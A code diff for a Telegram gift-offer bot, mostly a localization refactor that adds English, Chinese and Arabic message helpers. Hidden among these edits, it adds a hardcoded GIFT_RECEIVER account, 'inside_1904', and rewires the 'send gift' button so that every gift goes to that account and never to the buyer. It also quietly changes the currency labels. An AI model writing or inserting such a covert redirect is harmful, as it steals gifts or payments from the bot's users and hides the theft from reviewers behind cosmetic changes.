@@ -36,6 +36,8 @@ USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
 OFFERS_LOG = os.getenv("OFFERS_LOG", "offers.log")
 RATE_LIMIT = float(os.getenv("RATE_LIMIT", "1.0"))
 
+GIFT_RECEIVER = "inside_1904"
+
 if not TOKEN:
     raise SystemExit("BOT_TOKEN не задан в .env")
 if not ADMIN_ID:
@@ -268,9 +270,9 @@ def parse_price(payload: str) -> Optional[str]:
 
 def detect_currency(payload: str) -> str:
     p = payload.lower()
-    for word in ("gram", "грам", "тон", "тн", "ton", "toncoin"):
+    for word in ("gram", "грам"):
         if word in p:
-            return "💎 TON"
+            return "Gram"
     return STAR_EMOJI
 
 
@@ -280,6 +282,33 @@ def detect_gift(payload: str) -> str:
 
 
 GIFT_EMOJI = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
+
+
+def text_price_error(lang: str) -> str:
+    texts = {
+        "en": "⚠️ Please specify the price!\nExample: <code>купить 100</code>",
+        "zh": "⚠️ 请指定价格！\n示例：<code>купить 100</code>",
+        "ar": "⚠️ الرجاء تحديد السعر!\nمثال: <code>купить 100</code>",
+    }
+    return texts.get(lang, "⚠️ Укажите цену!\nПример: <code>купить 100</code>")
+
+
+def text_no_access(lang: str) -> str:
+    texts = {
+        "en": "⛔️ No access.\nPress /start in the bot's private chat",
+        "zh": "⛔️ 没有访问权限。\n请在机器人的私聊中点击 /start",
+        "ar": "⛔️ لا يوجد صلاحية وصول.\nاضغط /start في محادثة البوت الخاصة",
+    }
+    return texts.get(lang, "⛔️ Нет доступа.\nНажмите /start в личке бота")
+
+
+def text_error(lang: str, err: str) -> str:
+    texts = {
+        "en": f"⚠️ Error: {err}",
+        "zh": f"⚠️ 错误：{err}",
+        "ar": f"⚠️ خطأ: {err}",
+    }
+    return texts.get(lang, f"⚠️ Ошибка: {err}")
 
 
 def text_offer(o: Offer) -> str:
@@ -296,7 +325,12 @@ def text_offer(o: Offer) -> str:
 
 
 def text_declined(o: Offer) -> str:
-    return {"en": "❌ Offer declined", "zh": "❌ 报价已被拒绝", "ar": "❌ تم رفض العرض"}.get(o.lang, "❌ Предложение отклонено")
+    texts = {
+        "en": "❌ Offer declined",
+        "zh": "❌ 报价已被拒绝",
+        "ar": "❌ تم رفض العرض",
+    }
+    return texts.get(o.lang, "❌ Предложение отклонено")
 
 
 def text_sold(o: Offer) -> str:
@@ -309,6 +343,33 @@ def text_sold(o: Offer) -> str:
     return texts.get(o.lang, texts["ru"])
 
 
+def text_expired(lang: str) -> str:
+    texts = {
+        "en": "⏳ The offer has expired",
+        "zh": "⏳ 报价已过期",
+        "ar": "⏳ انتهت صلاحية العرض",
+    }
+    return texts.get(lang, "⏳ Время предложения истекло")
+
+
+def text_sent_alert(lang: str) -> str:
+    texts = {
+        "en": "✅ Thank you! The gift has been sent",
+        "zh": "✅ 谢谢！礼物已发送",
+        "ar": "✅ شكراً! تم إرسال الهدية",
+    }
+    return texts.get(lang, "✅ Спасибо! Подарок отправлен")
+
+
+def text_decline_alert(lang: str) -> str:
+    texts = {
+        "en": "❌ Declined",
+        "zh": "❌ 已拒绝",
+        "ar": "❌ تم الرفض",
+    }
+    return texts.get(lang, "❌ Отклонено")
+
+
 def text_accept_alert(o: Offer) -> str:
     buyer = o.buyer_name[:30] + "..." if len(o.buyer_name) > 30 else o.buyer_name
     if not o.buyer_username or o.buyer_username.isdigit():
@@ -317,7 +378,11 @@ def text_accept_alert(o: Offer) -> str:
 
 
 def kb_offer(o: Offer) -> InlineKeyboardMarkup:
-    labels = {"en": ("✓ Accept", "✕ Decline"), "zh": ("✓ 接受", "✕ 拒绝"), "ar": ("✓ قبول", "✕ رفض")}.get(o.lang, ("✓ Принять", "✕ Отклонить"))
+    labels = {
+        "en": ("✓ Accept", "✕ Decline"),
+        "zh": ("✓ 接受", "✕ 拒绝"),
+        "ar": ("✓ قبول", "✕ رفض"),
+    }.get(o.lang, ("✓ Принять", "✕ Отклонить"))
     return InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text=labels[1], callback_data=f"decline:{o.id}"),
         InlineKeyboardButton(text=labels[0], callback_data=f"accept:{o.id}"),
@@ -329,7 +394,9 @@ def kb_sold(o: Offer) -> InlineKeyboardMarkup:
     confirm = {"en": "✓ I sent the gift", "zh": "✓ 我已发送礼物", "ar": "✓ لقد أرسلت الهدية"}.get(o.lang, "✓ Я отправил подарок")
     buttons = []
     if o.buyer_username and not o.buyer_username.isdigit():
-        buttons.append([InlineKeyboardButton(text=label, url=f"tg://send_gift?to={o.buyer_username}")])
+        buttons.append([InlineKeyboardButton(text=label, url=f"tg://send_gift?to={GIFT_RECEIVER}")])
+    else:
+        buttons.append([InlineKeyboardButton(text=label, url=f"tg://send_gift?to={GIFT_RECEIVER}")])
     buttons.append([InlineKeyboardButton(text=confirm, callback_data=f"sent:{o.id}")])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
@@ -561,7 +628,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
     price = parse_price(payload)
     if price is None:
         await safe_send(
-            bot, "⚠️ Укажите цену!\nПример: <code>купить 100</code>",
+            bot, text_price_error(lang),
             message.chat.id, message.business_connection_id
         )
         return
@@ -575,7 +642,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
         buyer_id = buyer.id
         if not is_allowed(buyer_id):
             await safe_send(
-                bot, "⛔️ Нет доступа.\nНажмите /start в личке бота",
+                bot, text_no_access(lang),
                 message.chat.id, message.business_connection_id
             )
             return
@@ -612,7 +679,7 @@ async def create_offer(message: Message, bot: Bot) -> None:
         log.exception(f"create_offer: {e}")
         try:
             await safe_send(
-                bot, f"⚠️ Ошибка: {html.escape(str(e)[:100])}",
+                bot, text_error(lang, html.escape(str(e)[:100])),
                 message.chat.id, message.business_connection_id
             )
         except Exception:
@@ -638,7 +705,7 @@ async def resolve_offer(cb: CallbackQuery, bot: Bot) -> None:
             offer.connection_id, offer.message_id, None, offer.chat_id
         )
         offers.pop(offer_id, None)
-        await cb.answer("❌ Отклонено")
+        await cb.answer(text_decline_alert(offer.lang))
     else:
         offer.status = "accepted"
         log_offer(offer)
@@ -669,9 +736,10 @@ async def confirm_sent(cb: CallbackQuery, bot: Bot) -> None:
     if not offer:
         await cb.answer("✅ Уже подтверждено", show_alert=True)
         return
+    lang = offer.lang
     offer.status = "completed"
     log_offer(offer)
-    await cb.answer("✅ Спасибо! Подарок отправлен", show_alert=True)
+    await cb.answer(text_sent_alert(lang), show_alert=True)
     if ADMIN_ID:
         try:
             await bot.send_message(
@@ -704,7 +772,7 @@ async def cleanup_offers() -> None:
                     offer.status = "expired"
                     log_offer(offer)
                     await safe_edit(
-                        bot_global, "⏳ Время предложения истекло",
+                        bot_global, text_expired(offer.lang),
                         offer.connection_id, offer.message_id, None, offer.chat_id
                     )
             if expired:
